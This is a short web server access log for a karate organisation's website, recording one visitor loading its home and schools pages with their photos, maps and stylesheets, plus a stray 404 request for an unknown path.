::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:44 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /schools HTTP/1.1" 200 97308 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/carlos.jpg HTTP/1.1" 200 21431 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/arce.jpg HTTP/1.1" 200 14433 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/JohnPWKK.jpg HTTP/1.1" 200 7574 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/geoffrey.jpg HTTP/1.1" 200 14922 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/anthony.jpg HTTP/1.1" 200 14045 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/don.jpg HTTP/1.1" 200 76210 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/grant.jpg HTTP/1.1" 200 14249 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/herseybaker.jpg HTTP/1.1" 200 13988 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/jorge8th.jpg HTTP/1.1" 200 121759 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/justin.jpg HTTP/1.1" 200 14091 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/clarkb.jpeg HTTP/1.1" 200 12183 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 200 12841 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/fortiz.jpg HTTP/1.1" 200 82719 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/dokeeffe.jpg HTTP/1.1" 200 42708 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/mlee.jpg HTTP/1.1" 200 65525 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/acohen.jpg HTTP/1.1" 200 62805 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/andrea.jpg HTTP/1.1" 200 61330 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/btimlin.jpg HTTP/1.1" 200 378054 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 200 132490 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/RuPaster.jpg HTTP/1.1" 200 75352 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/achang.jpg HTTP/1.1" 200 32799 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 200 78389 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/amahalatinia.jpg HTTP/1.1" 200 84763 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/fnavarro.jpg HTTP/1.1" 200 7268 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/instructors/wkklogo.png HTTP/1.1" 200 35114 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 200 86185 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/fbpic.webp HTTP/1.1" 200 986 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/harborbaykaratedo.jpg HTTP/1.1" 200 77464 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/corpuzkaratedo.jpg HTTP/1.1" 200 65837 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 200 458708 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 200 264927 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/nunleykaratedo.jpg HTTP/1.1" 200 77040 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:45 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 200 32454 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:46 +0000] "GET /images/schools/zoomsfbakaratedo.jpg HTTP/1.1" 200 259024 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:46 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 200 1754187 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:46 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 200 1829058 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:172.105.77.209 - - [18/Nov/2022:23:55:52 +0000] "GET /0bef HTTP/1.0" 404 143 "-" "-"
::ffff:203.10.99.204 - - [18/Nov/2022:23:56:29 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
